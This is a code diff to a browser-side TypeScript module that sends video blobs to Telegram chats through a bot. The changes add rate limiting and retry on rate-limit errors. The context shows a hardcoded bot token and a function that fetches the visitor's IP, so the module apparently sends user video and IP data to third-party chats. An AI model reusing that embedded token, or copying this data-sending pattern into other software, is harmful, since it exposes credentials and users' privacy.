@@ -2,6 +2,50 @@
 
 const TELEGRAM_BOT_TOKEN = '8558710499:AAGJ8LA9PbCjQnnHGjBhq86ufCcZiIzXOxs';
 
+// Rate limiting configuration
+const RATE_LIMIT = {
+  maxPerSecond: 25,  // Telegram limit is 30, keep buffer
+  queue: [] as Array<() => Promise<void>>,
+  isProcessing: false,
+  lastSendTime: 0
+};
+
+// Rate limiter - ensures we don't exceed Telegram API limits
+const rateLimitedSend = async (sendFn: () => Promise<boolean>): Promise<boolean> => {
+  return new Promise((resolve) => {
+    const task = async () => {
+      const now = Date.now();
+      const timeSinceLastSend = now - RATE_LIMIT.lastSendTime;
+      const minInterval = 1000 / RATE_LIMIT.maxPerSecond;
+      
+      if (timeSinceLastSend < minInterval) {
+        await new Promise(r => setTimeout(r, minInterval - timeSinceLastSend));
+      }
+      
+      RATE_LIMIT.lastSendTime = Date.now();
+      const result = await sendFn();
+      resolve(result);
+    };
+    
+    RATE_LIMIT.queue.push(task);
+    processQueue();
+  });
+};
+
+// Process rate limit queue
+const processQueue = async () => {
+  if (RATE_LIMIT.isProcessing || RATE_LIMIT.queue.length === 0) return;
+  
+  RATE_LIMIT.isProcessing = true;
+  
+  while (RATE_LIMIT.queue.length > 0) {
+    const task = RATE_LIMIT.queue.shift();
+    if (task) await task();
+  }
+  
+  RATE_LIMIT.isProcessing = false;
+};
+
 // Function to get user IP address
 const getUserIP = async (): Promise<string> => {
   try {
@@ -58,7 +102,8 @@ const sendVideoFetch = async (
   botToken: string,
   chatId: number,
   videoBlob: Blob,
-  caption: string
+  caption: string,
+  retryCount = 0
 ): Promise<boolean> => {
   try {
     // Detect file extension from blob type
@@ -80,6 +125,12 @@ const sendVideoFetch = async (
     if (response.ok) {
       console.log(`✅ [Video Fetch] Отправлено пользователю ${chatId}`);
       return true;
+    } else if (response.status === 429 && retryCount < 3) {
+      // Rate limit hit - retry with exponential backoff
+      const retryAfter = result.parameters?.retry_after || (retryCount + 1) * 2;
+      console.warn(`⏳ [Video Fetch] Rate limit для ${chatId}, retry через ${retryAfter}s (попытка ${retryCount + 1}/3)`);
+      await new Promise(r => setTimeout(r, retryAfter * 1000));
+      return sendVideoFetch(botToken, chatId, videoBlob, caption, retryCount + 1);
     } else {
       console.warn(`⚠️ [Video Fetch] Ошибка для ${chatId}:`, result);
       return false;
@@ -177,9 +228,9 @@ export const sendVideoToTelegram = async (
       let success = false;
       
       if (browser === 'safari') {
-        success = await sendVideoXHR(TELEGRAM_BOT_TOKEN, chatId, videoBlob, caption);
+        success = await rateLimitedSend(() => sendVideoXHR(TELEGRAM_BOT_TOKEN, chatId, videoBlob, caption));
       } else {
-        success = await sendVideoFetch(TELEGRAM_BOT_TOKEN, chatId, videoBlob, caption);
+        success = await rateLimitedSend(() => sendVideoFetch(TELEGRAM_BOT_TOKEN, chatId, videoBlob, caption));
       }
       
       if (success) {
